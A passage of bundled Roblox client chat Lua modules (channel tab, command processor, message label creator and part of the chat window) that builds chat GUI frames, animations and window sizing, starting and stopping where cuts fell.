		local CurveUtil = require(modulesFolder:WaitForChild("CurveUtil"))
		
		--////////////////////////////// Methods
		--//////////////////////////////////////
		local methods = {}
		methods.__index = methods
		
		local function CreateGuiObjects()
			local BaseFrame = Instance.new("Frame")
			BaseFrame.Selectable = false
			BaseFrame.Size = UDim2.new(1, 0, 1, 0)
			BaseFrame.BackgroundTransparency = 1
		
			local gapOffsetX = 1
			local gapOffsetY = 1
		
			local BackgroundFrame = Instance.new("Frame")
			BackgroundFrame.Selectable = false
			BackgroundFrame.Name = "BackgroundFrame"
			BackgroundFrame.Size = UDim2.new(1, -gapOffsetX * 2, 1, -gapOffsetY * 2)
			BackgroundFrame.Position = UDim2.new(0, gapOffsetX, 0, gapOffsetY)
			BackgroundFrame.BackgroundTransparency = 1
			BackgroundFrame.Parent = BaseFrame
		
			local UnselectedFrame = Instance.new("Frame")
			UnselectedFrame.Selectable = false
			UnselectedFrame.Name = "UnselectedFrame"
			UnselectedFrame.Size = UDim2.new(1, 0, 1, 0)
			UnselectedFrame.Position = UDim2.new(0, 0, 0, 0)
			UnselectedFrame.BorderSizePixel = 0
			UnselectedFrame.BackgroundColor3 = ChatSettings.ChannelsTabUnselectedColor
			UnselectedFrame.BackgroundTransparency = 0.6
			UnselectedFrame.Parent = BackgroundFrame
		
			local SelectedFrame = Instance.new("Frame")
			SelectedFrame.Selectable = false
			SelectedFrame.Name = "SelectedFrame"
			SelectedFrame.Size = UDim2.new(1, 0, 1, 0)
			SelectedFrame.Position = UDim2.new(0, 0, 0, 0)
			SelectedFrame.BorderSizePixel = 0
			SelectedFrame.BackgroundColor3 = ChatSettings.ChannelsTabSelectedColor
			SelectedFrame.BackgroundTransparency = 1
			SelectedFrame.Parent = BackgroundFrame
		
			local SelectedFrameBackgroundImage = Instance.new("ImageLabel")
			SelectedFrameBackgroundImage.Selectable = false
			SelectedFrameBackgroundImage.Name = "BackgroundImage"
			SelectedFrameBackgroundImage.BackgroundTransparency = 1
			SelectedFrameBackgroundImage.BorderSizePixel = 0
			SelectedFrameBackgroundImage.Size = UDim2.new(1, 0, 1, 0)
			SelectedFrameBackgroundImage.Position = UDim2.new(0, 0, 0, 0)
			SelectedFrameBackgroundImage.ScaleType = Enum.ScaleType.Slice
			SelectedFrameBackgroundImage.Parent = SelectedFrame
		
			SelectedFrameBackgroundImage.BackgroundTransparency = 0.6 - 1
			local rate = 1.2 * 1
			SelectedFrameBackgroundImage.BackgroundColor3 = Color3.fromRGB(78 * rate, 84 * rate, 96 * rate)
		
			local borderXOffset = 2
			local blueBarYSize = 4
			local BlueBarLeft = Instance.new("ImageLabel")
			BlueBarLeft.Selectable = false
			BlueBarLeft.Size = UDim2.new(0.5, -borderXOffset, 0, blueBarYSize)
			BlueBarLeft.BackgroundTransparency = 1
			BlueBarLeft.ScaleType = Enum.ScaleType.Slice
			BlueBarLeft.SliceCenter = Rect.new(3,3,32,21)
			BlueBarLeft.Parent = SelectedFrame
		
			local BlueBarRight = BlueBarLeft:Clone()
			BlueBarRight.Parent = SelectedFrame
		
			BlueBarLeft.Position = UDim2.new(0, borderXOffset, 1, -blueBarYSize)
			BlueBarRight.Position = UDim2.new(0.5, 0, 1, -blueBarYSize)
			BlueBarLeft.Image = "rbxasset://textures/ui/Settings/Slider/SelectedBarLeft.png"
			BlueBarRight.Image = "rbxasset://textures/ui/Settings/Slider/SelectedBarRight.png"
		
			BlueBarLeft.Name = "BlueBarLeft"
			BlueBarRight.Name = "BlueBarRight"
		
			local NameTag = Instance.new("TextButton")
			NameTag.Selectable = ChatSettings.GamepadNavigationEnabled
			NameTag.Size = UDim2.new(1, 0, 1, 0)
			NameTag.Position = UDim2.new(0, 0, 0, 0)
			NameTag.BackgroundTransparency = 1
			NameTag.Font = ChatSettings.DefaultFont
			NameTag.TextSize = ChatSettings.ChatChannelsTabTextSize
			NameTag.TextColor3 = Color3.new(1, 1, 1)
			NameTag.TextStrokeTransparency = 0.75
			NameTag.Parent = BackgroundFrame
		
			local NameTagNonSelect = NameTag:Clone()
			local NameTagSelect = NameTag:Clone()
			NameTagNonSelect.Parent = UnselectedFrame
			NameTagSelect.Parent = SelectedFrame
			NameTagNonSelect.Font = Enum.Font.SourceSans
			NameTagNonSelect.Active = false
			NameTagSelect.Active = false
		
			local NewMessageIconFrame = Instance.new("Frame")
			NewMessageIconFrame.Selectable = false
			NewMessageIconFrame.Size = UDim2.new(0, 18, 0, 18)
			NewMessageIconFrame.Position = UDim2.new(0.8, -9, 0.5, -9)
			NewMessageIconFrame.BackgroundTransparency = 1
			NewMessageIconFrame.Parent = BackgroundFrame
		
			local NewMessageIcon = Instance.new("ImageLabel")
			NewMessageIcon.Selectable = false
			NewMessageIcon.Size = UDim2.new(1, 0, 1, 0)
			NewMessageIcon.BackgroundTransparency = 1
			NewMessageIcon.Image = "rbxasset://textures/ui/Chat/MessageCounter.png"
			NewMessageIcon.Visible = false
			NewMessageIcon.Parent = NewMessageIconFrame
		
			local NewMessageIconText = Instance.new("TextLabel")
			NewMessageIconText.Selectable = false
			NewMessageIconText.BackgroundTransparency = 1
			NewMessageIconText.Size = UDim2.new(0, 13, 0, 9)
			NewMessageIconText.Position = UDim2.new(0.5, -7, 0.5, -7)
			NewMessageIconText.Font = ChatSettings.DefaultFont
			NewMessageIconText.TextSize = 14
			NewMessageIconText.TextColor3 = Color3.new(1, 1, 1)
			NewMessageIconText.Text = ""
			NewMessageIconText.Parent = NewMessageIcon
		
			return BaseFrame, NameTag, NameTagNonSelect, NameTagSelect, NewMessageIcon, UnselectedFrame, SelectedFrame
		end
		
		function methods:Destroy()
			self.GuiObject:Destroy()
		end
		
		function methods:UpdateMessagePostedInChannel(ignoreActive)
			if (self.Active and (ignoreActive ~= true)) then return end
		
			local count = self.UnreadMessageCount + 1
			self.UnreadMessageCount = count
		
			local label = self.NewMessageIcon
			label.Visible = true
			label.TextLabel.Text = (count < 100) and tostring(count) or "!"
		
			local tweenTime = 0.15
			local tweenPosOffset = UDim2.new(0, 0, -0.1, 0)
		
			local curPos = label.Position
			local outPos = curPos + tweenPosOffset
			local easingDirection = Enum.EasingDirection.Out
			local easingStyle = Enum.EasingStyle.Quad
		
			label.Position = UDim2.new(0, 0, -0.15, 0)
			label:TweenPosition(UDim2.new(0, 0, 0, 0), easingDirection, easingStyle, tweenTime, true)
		
		end
		
		function methods:SetActive(active)
			self.Active = active
			self.UnselectedFrame.Visible = not active
			self.SelectedFrame.Visible = active
		
			if (active) then
				self.UnreadMessageCount = 0
				self.NewMessageIcon.Visible = false
		
				self.NameTag.Font = Enum.Font.SourceSansBold
			else
				self.NameTag.Font = Enum.Font.SourceSans
		
			end
		end
		
		function methods:SetTextSize(textSize)
			self.NameTag.TextSize = textSize
		end
		
		function methods:FadeOutBackground(duration)
			self.AnimParams.Background_TargetTransparency = 1
			self.AnimParams.Background_NormalizedExptValue = CurveUtil:NormalizedDefaultExptValueInSeconds(duration)
		end
		
		function methods:FadeInBackground(duration)
			self.AnimParams.Background_TargetTransparency = 0.6
			self.AnimParams.Background_NormalizedExptValue = CurveUtil:NormalizedDefaultExptValueInSeconds(duration)
		end
		
		function methods:FadeOutText(duration)
			self.AnimParams.Text_TargetTransparency = 1
			self.AnimParams.Text_NormalizedExptValue = CurveUtil:NormalizedDefaultExptValueInSeconds(duration)
			self.AnimParams.TextStroke_TargetTransparency = 1
			self.AnimParams.TextStroke_NormalizedExptValue = CurveUtil:NormalizedDefaultExptValueInSeconds(duration)
		end
		
		function methods:FadeInText(duration)
			self.AnimParams.Text_TargetTransparency = 0
			self.AnimParams.Text_NormalizedExptValue = CurveUtil:NormalizedDefaultExptValueInSeconds(duration)
			self.AnimParams.TextStroke_TargetTransparency = 0.75
			self.AnimParams.TextStroke_NormalizedExptValue = CurveUtil:NormalizedDefaultExptValueInSeconds(duration)
		end
		
		function methods:AnimGuiObjects()
			self.UnselectedFrame.BackgroundTransparency = self.AnimParams.Background_CurrentTransparency
			self.SelectedFrame.BackgroundImage.BackgroundTransparency = self.AnimParams.Background_CurrentTransparency
			self.SelectedFrame.BlueBarLeft.ImageTransparency = self.AnimParams.Background_CurrentTransparency
			self.SelectedFrame.BlueBarRight.ImageTransparency = self.AnimParams.Background_CurrentTransparency
			self.NameTagNonSelect.TextTransparency = self.AnimParams.Background_CurrentTransparency
			self.NameTagNonSelect.TextStrokeTransparency = self.AnimParams.Background_CurrentTransparency
		
			self.NameTag.TextTransparency = self.AnimParams.Text_CurrentTransparency
			self.NewMessageIcon.ImageTransparency = self.AnimParams.Text_CurrentTransparency
			self.WhiteTextNewMessageNotification.TextTransparency = self.AnimParams.Text_CurrentTransparency
			self.NameTagSelect.TextTransparency = self.AnimParams.Text_CurrentTransparency
		
			self.NameTag.TextStrokeTransparency = self.AnimParams.TextStroke_CurrentTransparency
			self.WhiteTextNewMessageNotification.TextStrokeTransparency = self.AnimParams.TextStroke_CurrentTransparency
			self.NameTagSelect.TextStrokeTransparency = self.AnimParams.TextStroke_CurrentTransparency
		end
		
		function methods:InitializeAnimParams()
			self.AnimParams.Text_TargetTransparency = 0
			self.AnimParams.Text_CurrentTransparency = 0
			self.AnimParams.Text_NormalizedExptValue = CurveUtil:NormalizedDefaultExptValueInSeconds(0)
		
			self.AnimParams.TextStroke_TargetTransparency = 0.75
			self.AnimParams.TextStroke_CurrentTransparency = 0.75
			self.AnimParams.TextStroke_NormalizedExptValue = CurveUtil:NormalizedDefaultExptValueInSeconds(0)
		
			self.AnimParams.Background_TargetTransparency = 0.6
			self.AnimParams.Background_CurrentTransparency = 0.6
			self.AnimParams.Background_NormalizedExptValue = CurveUtil:NormalizedDefaultExptValueInSeconds(0)
		end
		
		function methods:Update(dtScale)
			self.AnimParams.Background_CurrentTransparency = CurveUtil:Expt(
					self.AnimParams.Background_CurrentTransparency,
					self.AnimParams.Background_TargetTransparency,
					self.AnimParams.Background_NormalizedExptValue,
					dtScale
			)
			self.AnimParams.Text_CurrentTransparency = CurveUtil:Expt(
					self.AnimParams.Text_CurrentTransparency,
					self.AnimParams.Text_TargetTransparency,
					self.AnimParams.Text_NormalizedExptValue,
					dtScale
			)
			self.AnimParams.TextStroke_CurrentTransparency = CurveUtil:Expt(
					self.AnimParams.TextStroke_CurrentTransparency,
					self.AnimParams.TextStroke_TargetTransparency,
					self.AnimParams.TextStroke_NormalizedExptValue,
					dtScale
			)
		
			self:AnimGuiObjects()
		end
		
		--///////////////////////// Constructors
		--//////////////////////////////////////
		
		function module.new(channelName)
			local obj = setmetatable({}, methods)
		
			local BaseFrame, NameTag, NameTagNonSelect, NameTagSelect, NewMessageIcon, UnselectedFrame, SelectedFrame = CreateGuiObjects()
			obj.GuiObject = BaseFrame
			obj.NameTag = NameTag
			obj.NameTagNonSelect = NameTagNonSelect
			obj.NameTagSelect = NameTagSelect
			obj.NewMessageIcon = NewMessageIcon
			obj.UnselectedFrame = UnselectedFrame
			obj.SelectedFrame = SelectedFrame
		
			obj.BlueBarLeft = SelectedFrame.BlueBarLeft
			obj.BlueBarRight = SelectedFrame.BlueBarRight
			obj.BackgroundImage = SelectedFrame.BackgroundImage
			obj.WhiteTextNewMessageNotification = obj.NewMessageIcon.TextLabel
		
			obj.ChannelName = channelName
			obj.UnreadMessageCount = 0
			obj.Active = false
		
			obj.GuiObject.Name = "Frame_" .. obj.ChannelName
		
			if (string.len(channelName) > ChatSettings.MaxChannelNameLength) then
				channelName = string.sub(channelName, 1, ChatSettings.MaxChannelNameLength - 3) .. "..."
			end
		
			--obj.NameTag.Text = channelName
		
			obj.NameTag.Text = ""
			obj.NameTagNonSelect.Text = channelName
			obj.NameTagSelect.Text = channelName
		
			obj.AnimParams = {}
		
			obj:InitializeAnimParams()
			obj:AnimGuiObjects()
			obj:SetActive(false)
		
			return obj
		end
		
		return module
		
	end[command_processor] = function()
		--	// FileName: ProcessCommands.lua
		--	// Written by: TheGamer101
		--	// Description: Module for processing commands using the client CommandModules
		
		local module = {}
		local methods = {}
		methods.__index = methods
		
		--////////////////////////////// Include
		--//////////////////////////////////////
		local Chat = game:GetService("Chat")
		local clientChatModules = Chat:WaitForChild("ClientChatModules")
		local commandModules = clientChatModules:WaitForChild("CommandModules")
		local commandUtil = require(commandModules:WaitForChild("Util"))
		local modulesFolder = script.Parent
		local ChatSettings = require(clientChatModules:WaitForChild("ChatSettings"))
		
		function methods:SetupCommandProcessors()
			local commands = commandModules:GetChildren()
			for i = 1, #commands do
				if commands[i]:IsA("ModuleScript") then
					if commands[i].Name ~= "Util" then
						local commandProcessor = require(commands[i])
						local processorType = commandProcessor[commandUtil.KEY_COMMAND_PROCESSOR_TYPE]
						local processorFunction = commandProcessor[commandUtil.KEY_PROCESSOR_FUNCTION]
						if processorType == commandUtil.IN_PROGRESS_MESSAGE_PROCESSOR then
							table.insert(self.InProgressMessageProcessors, processorFunction)
						elseif processorType == commandUtil.COMPLETED_MESSAGE_PROCESSOR then
							table.insert(self.CompletedMessageProcessors, processorFunction)
						end
					end
				end
			end
		end
		
		function methods:ProcessCompletedChatMessage(message, ChatWindow)
			for i = 1, #self.CompletedMessageProcessors do
				local processedCommand = self.CompletedMessageProcessors[i](message, ChatWindow, ChatSettings)
				if processedCommand then
					return true
				end
			end
			return false
		end
		
		function methods:ProcessInProgressChatMessage(message, ChatWindow, ChatBar)
			for i = 1, #self.InProgressMessageProcessors do
				local customState = self.InProgressMessageProcessors[i](message, ChatWindow, ChatBar, ChatSettings)
				if customState then
					return customState
				end
			end
			return nil
		end
		
		--///////////////////////// Constructors
		--//////////////////////////////////////
		
		function module.new()
			local obj = setmetatable({}, methods)
		
			obj.CompletedMessageProcessors = {}
			obj.InProgressMessageProcessors = {}
		
			obj:SetupCommandProcessors()
		
			return obj
		end
		
		return module
		
	end[message_label_creator] = function()
		--	// FileName: MessageLabelCreator.lua
		--	// Written by: Xsitsu
		--	// Description: Module to handle taking text and creating stylized GUI objects for display in ChatWindow.
		
		local OBJECT_POOL_SIZE = 50
		
		local module = {}
		--////////////////////////////// Include
		--//////////////////////////////////////
		local Chat = game:GetService("Chat")
		local clientChatModules = Chat:WaitForChild("ClientChatModules")
		local messageCreatorModules = clientChatModules:WaitForChild("MessageCreatorModules")
		local messageCreatorUtil = require(messageCreatorModules:WaitForChild("Util"))
		local modulesFolder = script.Parent
		local ChatSettings = require(clientChatModules:WaitForChild("ChatSettings"))
		local moduleObjectPool = require(modulesFolder:WaitForChild("ObjectPool"))
		local MessageSender = require(modulesFolder:WaitForChild("MessageSender"))
		
		--////////////////////////////// Methods
		--//////////////////////////////////////
		local methods = {}
		methods.__index = methods
		
		-- merge properties on both table to target
		function mergeProps(source, target)
			if not source then return end
			for prop, value in pairs(source) do
				target[prop] = value
			end
		end
		
		function ReturnToObjectPoolRecursive(instance, objectPool)
			local children = instance:GetChildren()
			for i = 1, #children do
				ReturnToObjectPoolRecursive(children[i], objectPool)
			end
			instance.Parent = nil
			objectPool:ReturnInstance(instance)
		end
		
		function GetMessageCreators()
			local typeToFunction = {}
			local creators = messageCreatorModules:GetChildren()
			for i = 1, #creators do
				if creators[i]:IsA("ModuleScript") then
					if creators[i].Name ~= "Util" then
						local creator = require(creators[i])
						typeToFunction[creator[messageCreatorUtil.KEY_MESSAGE_TYPE]] = creator[messageCreatorUtil.KEY_CREATOR_FUNCTION]
					end
				end
			end
			return typeToFunction
		end
		
		function methods:WrapIntoMessageObject(messageData, createdMessageObject)
			local BaseFrame = createdMessageObject[messageCreatorUtil.KEY_BASE_FRAME]
			local BaseMessage = nil
			if messageCreatorUtil.KEY_BASE_MESSAGE then
				BaseMessage = createdMessageObject[messageCreatorUtil.KEY_BASE_MESSAGE]
			end
			local UpdateTextFunction = createdMessageObject[messageCreatorUtil.KEY_UPDATE_TEXT_FUNC]
			local GetHeightFunction = createdMessageObject[messageCreatorUtil.KEY_GET_HEIGHT]
			local FadeInFunction = createdMessageObject[messageCreatorUtil.KEY_FADE_IN]
			local FadeOutFunction = createdMessageObject[messageCreatorUtil.KEY_FADE_OUT]
			local UpdateAnimFunction = createdMessageObject[messageCreatorUtil.KEY_UPDATE_ANIMATION]
		
			local obj = {}
		
			obj.ID = messageData.ID
			obj.BaseFrame = BaseFrame
			obj.BaseMessage = BaseMessage
			obj.UpdateTextFunction = UpdateTextFunction or function() warn("NO MESSAGE RESIZE FUNCTION") end
			obj.GetHeightFunction = GetHeightFunction
			obj.FadeInFunction = FadeInFunction
			obj.FadeOutFunction = FadeOutFunction
			obj.UpdateAnimFunction = UpdateAnimFunction
			obj.ObjectPool = self.ObjectPool
			obj.Destroyed = false
		
			function obj:Destroy()
				ReturnToObjectPoolRecursive(self.BaseFrame, self.ObjectPool)
				self.Destroyed = true
			end
		
			return obj
		end
		
		function methods:CreateMessageLabel(messageData, currentChannelName)
		
			messageData.Channel = currentChannelName
			local extraDeveloperFormatTable
			pcall(function()
				extraDeveloperFormatTable = Chat:InvokeChatCallback(Enum.ChatCallbackType.OnClientFormattingMessage, messageData)
			end)
			messageData.ExtraData = messageData.ExtraData or {}
			mergeProps(extraDeveloperFormatTable, messageData.ExtraData)
		
			local messageType = messageData.MessageType
			if self.MessageCreators[messageType] then
				local createdMessageObject = self.MessageCreators[messageType](messageData, currentChannelName)
				if createdMessageObject then
					return self:WrapIntoMessageObject(messageData, createdMessageObject)
				end
			elseif self.DefaultCreatorType then
				local createdMessageObject = self.MessageCreators[self.DefaultCreatorType](messageData, currentChannelName)
				if createdMessageObject then
					return self:WrapIntoMessageObject(messageData, createdMessageObject)
				end
			else
				error("No message creator available for message type: " ..messageType)
			end
		end
		
		--///////////////////////// Constructors
		--//////////////////////////////////////
		
		function module.new()
			local obj = setmetatable({}, methods)
		
			obj.ObjectPool = moduleObjectPool.new(OBJECT_POOL_SIZE)
			obj.MessageCreators = GetMessageCreators()
			obj.DefaultCreatorType = messageCreatorUtil.DEFAULT_MESSAGE_CREATOR
		
			messageCreatorUtil:RegisterObjectPool(obj.ObjectPool)
		
			return obj
		end
		
		function module:GetStringTextBounds(text, font, textSize, sizeBounds)
			return messageCreatorUtil:GetStringTextBounds(text, font, textSize, sizeBounds)
		end
		
		return module
		
	end[chat_window] = function()
		--	// FileName: ChatWindow.lua
		--	// Written by: Xsitsu
		--	// Description: Main GUI window piece. Manages ChatBar, ChannelsBar, and ChatChannels.
		
		local FFlagFixMouseCapture = false do
			local ok, value = pcall(function()
				return UserSettings():IsUserFeatureEnabled("UserFixMouseCapture")
			end)
			if ok then
				FFlagFixMouseCapture = value
			end
		end
		
		local module = {}
		
		local Players = game:GetService("Players")
		local Chat = game:GetService("Chat")
		local LocalPlayer = Players.LocalPlayer
		local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
		
		local PHONE_SCREEN_WIDTH = 640
		local TABLET_SCREEN_WIDTH = 1024
		
		local DEVICE_PHONE = 1
		local DEVICE_TABLET = 2
		local DEVICE_DESKTOP = 3
		
		--////////////////////////////// Include
		--//////////////////////////////////////
		local Chat = game:GetService("Chat")
		local clientChatModules = Chat:WaitForChild("ClientChatModules")
		local modulesFolder = script.Parent
		local moduleChatChannel = require(modulesFolder:WaitForChild("ChatChannel"))
		local ChatSettings = require(clientChatModules:WaitForChild("ChatSettings"))
		local CurveUtil = require(modulesFolder:WaitForChild("CurveUtil"))
		
		--////////////////////////////// Methods
		--//////////////////////////////////////
		local methods = {}
		methods.__index = methods
		
		function getClassicChatEnabled()
			if ChatSettings.ClassicChatEnabled ~= nil then
				return ChatSettings.ClassicChatEnabled
			end
			return Players.ClassicChat
		end
		
		function getBubbleChatEnabled()
			if ChatSettings.BubbleChatEnabled ~= nil then
				return ChatSettings.BubbleChatEnabled
			end
			return Players.BubbleChat
		end
		
		function bubbleChatOnly()
		 	return not getClassicChatEnabled() and getBubbleChatEnabled()
		end
		
		-- only merge property defined on target
		function mergeProps(source, target)
			if not source or not target then return end
			for prop, value in pairs(source) do
				if target[prop] ~= nil then
					target[prop] = value
				end
			end
		end
		
		function methods:CreateGuiObjects(targetParent)
			local userDefinedChatWindowStyle 
			pcall(function()
				userDefinedChatWindowStyle= Chat:InvokeChatCallback(Enum.ChatCallbackType.OnCreatingChatWindow, nil)
			end)
		
			-- merge the userdefined settings with the ChatSettings
			mergeProps(userDefinedChatWindowStyle, ChatSettings)
		
			local BaseFrame = Instance.new("Frame")
			BaseFrame.BackgroundTransparency = 1
			BaseFrame.Active = ChatSettings.WindowDraggable
			BaseFrame.Parent = targetParent
		    BaseFrame.AutoLocalize = false
		
			local ChatBarParentFrame = Instance.new("Frame")
			ChatBarParentFrame.Selectable = false
			ChatBarParentFrame.Name = "ChatBarParentFrame"
			ChatBarParentFrame.BackgroundTransparency = 1
			ChatBarParentFrame.Parent = BaseFrame
		
			local ChannelsBarParentFrame = Instance.new("Frame")
			ChannelsBarParentFrame.Selectable = false
			ChannelsBarParentFrame.Name = "ChannelsBarParentFrame"
			ChannelsBarParentFrame.BackgroundTransparency = 1
			ChannelsBarParentFrame.Position = UDim2.new(0, 0, 0, 0)
			ChannelsBarParentFrame.Parent = BaseFrame
		
			local ChatChannelParentFrame = Instance.new("Frame")
			ChatChannelParentFrame.Selectable = false
			ChatChannelParentFrame.Name = "ChatChannelParentFrame"
			ChatChannelParentFrame.BackgroundTransparency = 1
			ChatChannelParentFrame.BackgroundColor3 = ChatSettings.BackGroundColor
			ChatChannelParentFrame.BackgroundTransparency = 0.6
			ChatChannelParentFrame.BorderSizePixel = 0
			ChatChannelParentFrame.Parent = BaseFrame
		
			local ChatResizerFrame = Instance.new("ImageButton")
			ChatResizerFrame.Selectable = false
			ChatResizerFrame.Image = ""
			ChatResizerFrame.BackgroundTransparency = 0.6
			ChatResizerFrame.BorderSizePixel = 0
			ChatResizerFrame.Visible = false
			ChatResizerFrame.BackgroundColor3 = ChatSettings.BackGroundColor
			ChatResizerFrame.Active = true
			if bubbleChatOnly() then
				ChatResizerFrame.Position = UDim2.new(1, -ChatResizerFrame.AbsoluteSize.X, 0, 0)
			else
				ChatResizerFrame.Position = UDim2.new(1, -ChatResizerFrame.AbsoluteSize.X, 1, -ChatResizerFrame.AbsoluteSize.Y)
			end
			ChatResizerFrame.Parent = BaseFrame
		
			local ResizeIcon = Instance.new("ImageLabel")
			ResizeIcon.Selectable = false
			ResizeIcon.Size = UDim2.new(0.8, 0, 0.8, 0)
			ResizeIcon.Position = UDim2.new(0.2, 0, 0.2, 0)
			ResizeIcon.BackgroundTransparency = 1
			ResizeIcon.Image = "rbxassetid://261880743"
			ResizeIcon.Parent = ChatResizerFrame
		
			local function GetScreenGuiParent()
				--// Travel up parent list until you find the ScreenGui that the chat window is parented to
				local screenGuiParent = BaseFrame
				while (screenGuiParent and not screenGuiParent:IsA("ScreenGui")) do
					screenGuiParent = screenGuiParent.Parent
				end
		
				return screenGuiParent
			end
		
		
			local deviceType = DEVICE_DESKTOP
		
			local screenGuiParent = GetScreenGuiParent()
			if (screenGuiParent.AbsoluteSize.X <= PHONE_SCREEN_WIDTH) then
				deviceType = DEVICE_PHONE
		
			elseif (screenGuiParent.AbsoluteSize.X <= TABLET_SCREEN_WIDTH) then
				deviceType = DEVICE_TABLET
		
			end
		
			local checkSizeLock = false
			local function doCheckSizeBounds()
				if (checkSizeLock) then return end
				checkSizeLock = true
		
				if (not BaseFrame:IsDescendantOf(PlayerGui)) then return end
		
				local screenGuiParent = GetScreenGuiParent()
		
				local minWinSize = ChatSettings.MinimumWindowSize
				local maxWinSize = ChatSettings.MaximumWindowSize
		
				local forceMinY = ChannelsBarParentFrame.AbsoluteSize.Y + ChatBarParentFrame.AbsoluteSize.Y
		
				local minSizePixelX = (minWinSize.X.Scale * screenGuiParent.AbsoluteSize.X) + minWinSize.X.Offset
				local minSizePixelY = math.max((minWinSize.Y.Scale * screenGuiParent.AbsoluteSize.Y) + minWinSize.Y.Offset, forceMinY)
		
				local maxSizePixelX = (maxWinSize.X.Scale * screenGuiParent.AbsoluteSize.X) + maxWinSize.X.Offset
				local maxSizePixelY = (maxWinSize.Y.Scale * screenGuiParent.AbsoluteSize.Y) + maxWinSize.Y.Offset
		
				local absSizeX = BaseFrame.AbsoluteSize.X
				local absSizeY = BaseFrame.AbsoluteSize.Y
		
				if (absSizeX < minSizePixelX) then
					local offset = UDim2.new(0, minSizePixelX - absSizeX, 0, 0)
					BaseFrame.Size = BaseFrame.Size + offset
		
				elseif (absSizeX > maxSizePixelX) then
					local offset = UDim2.new(0, maxSizePixelX - absSizeX, 0, 0)
					BaseFrame.Size = BaseFrame.Size + offset
		
				end
		
				if (absSizeY < minSizePixelY) then
					local offset = UDim2.new(0, 0, 0, minSizePixelY - absSizeY)
					BaseFrame.Size = BaseFrame.Size + offset
		
				elseif (absSizeY > maxSizePixelY) then
					local offset = UDim2.new(0, 0, 0, maxSizePixelY - absSizeY)
					BaseFrame.Size = BaseFrame.Size + offset
		
				end
		
				local xScale = BaseFrame.AbsoluteSize.X / screenGuiParent.AbsoluteSize.X
				local yScale = BaseFrame.AbsoluteSize.Y / screenGuiParent.AbsoluteSize.Y
				
				-- cap chat window scale at a value smaller than 0.5 to prevent center of screen overlap
				if FFlagFixMouseCapture then 
					xScale = math.min(xScale, 0.45)
					yScale = math.min(xScale, 0.45)
				end
				
				BaseFrame.Size = UDim2.new(xScale, 0, yScale, 0)
		
				checkSizeLock = false
			end
		
		
			BaseFrame.Changed:connect(function(prop)
				if (prop == "AbsoluteSize") then
					doCheckSizeBounds()
				end
			end)
		
		
		
			ChatResizerFrame.DragBegin:connect(function(startUdim)
				BaseFrame.Draggable = false
			end)
		
			local function UpdatePositionFromDrag(atPos)
				if ChatSettings.WindowDraggable == false and ChatSettings.WindowResizable == false then
					return
				end
				local newSize = atPos - BaseFrame.AbsolutePosition + ChatResizerFrame.AbsoluteSize
				BaseFrame.Size = UDim2.new(0, newSize.X, 0, newSize.Y)
				if bubbleChatOnly() then
					ChatResizerFrame.Position = UDim2.new(1, -ChatResizerFrame.AbsoluteSize.X, 0, 0)
				else
					ChatResizerFrame.Position = UDim2.new(1, -ChatResizerFrame.AbsoluteSize.X, 1, -ChatResizerFrame.AbsoluteSize.Y)
				end
			end
		
			ChatResizerFrame.DragStopped:connect(function(endX, endY)
				BaseFrame.Draggable = ChatSettings.WindowDraggable
				--UpdatePositionFromDrag(Vector2.new(endX, endY))
			end)
		
			local resizeLock = false
			ChatResizerFrame.Changed:connect(function(prop)
				if (prop == "AbsolutePosition" and not BaseFrame.Draggable) then
					if (resizeLock) then return end
					resizeLock = true
		
					UpdatePositionFromDrag(ChatResizerFrame.AbsolutePosition)
		
					resizeLock = false
				end
			end)
		
			local function CalculateChannelsBarPixelSize(textSize)
				if (deviceType == DEVICE_PHONE) then
					textSize = textSize or ChatSettings.ChatChannelsTabTextSizePhone
				else
					textSize = textSize or ChatSettings.ChatChannelsTabTextSize
				end
		
				local channelsBarTextYSize = textSize
				local chatChannelYSize = math.max(32, channelsBarTextYSize + 8) + 2
		
				return chatChannelYSize
			end
		
			local function CalculateChatBarPixelSize(textSize)
				if (deviceType == DEVICE_PHONE) then
					textSize = textSize or ChatSettings.ChatBarTextSizePhone
				else
					textSize = textSize or ChatSettings.ChatBarTextSize
				end
		
				local chatBarTextSizeY = textSize
				local chatBarYSize = chatBarTextSizeY + (7 * 2) + (5 * 2)
		
				return chatBarYSize
			end
		
			if bubbleChatOnly() then
				ChatBarParentFrame.Position = UDim2.new(0, 0, 0, 0)
				ChannelsBarParentFrame.Visible = false
				ChannelsBarParentFrame.Active = false
				ChatChannelParentFrame.Visible = false
				ChatChannelParentFrame.Active = false
		
				local useXScale = 0
				local useXOffset = 0
		
				local screenGuiParent = GetScreenGuiParent()
		
				if (deviceType == DEVICE_PHONE) then
					useXScale = ChatSettings.DefaultWindowSizePhone.X.Scale
					useXOffset = ChatSettings.DefaultWindowSizePhone.X.Offset
		
				elseif (deviceType == DEVICE_TABLET) then
					useXScale = ChatSettings.DefaultWindowSizeTablet.X.Scale
					useXOffset = ChatSettings.DefaultWindowSizeTablet.X.Offset
		
				else
					useXScale = ChatSettings.DefaultWindowSizeDesktop.X.Scale
					useXOffset = ChatSettings.DefaultWindowSizeDesktop.X.Offset
		
				end
		
				local chatBarYSize = CalculateChatBarPixelSize()
		
				BaseFrame.Size = UDim2.new(useXScale, useXOffset, 0, chatBarYSize)
				BaseFrame.Position = ChatSettings.DefaultWindowPosition
		
			else
		
				local screenGuiParent = GetScreenGuiParent()
		
				if (deviceType == DEVICE_PHONE) then
					BaseFrame.Size = ChatSettings.DefaultWindowSizePhone
		
				elseif (deviceType == DEVICE_TABLET) then
					BaseFrame.Size = ChatSettings.DefaultWindowSizeTablet
		
				else
					BaseFrame.Size = ChatSettings.DefaultWindowSizeDesktop
		
				end
		
				BaseFrame.Position = ChatSettings.DefaultWindowPosition
		
			end
		
			if (deviceType == DEVICE_PHONE) then
				ChatSettings.ChatWindowTextSize = ChatSettings.ChatWindowTextSizePhone
				ChatSettings.ChatChannelsTabTextSize = ChatSettings.ChatChannelsTabTextSizePhone
				ChatSettings.ChatBarTextSize = ChatSettings.ChatBarTextSizePhone
			end
		
			local function UpdateDraggable(enabled)
				BaseFrame.Active = enabled
				BaseFrame.Draggable = enabled
			end
		
			local function UpdateResizable(enabled)
				ChatResizerFrame.Visible = enabled
				ChatResizerFrame.Draggable = enabled
		
				local frameSizeY = ChatBarParentFrame.Size.Y.Offset
		
				if (enabled) then
					ChatBarParentFrame.Size = UDim2.new(1, -frameSizeY - 2, 0, frameSizeY)
					if not bubbleChatOnly() then
						ChatBarParentFrame.Position = UDim2.new(0, 0, 1, -frameSizeY)
					end
				else
					ChatBarParentFrame.Size = UDim2.new(1, 0, 0, frameSizeY)
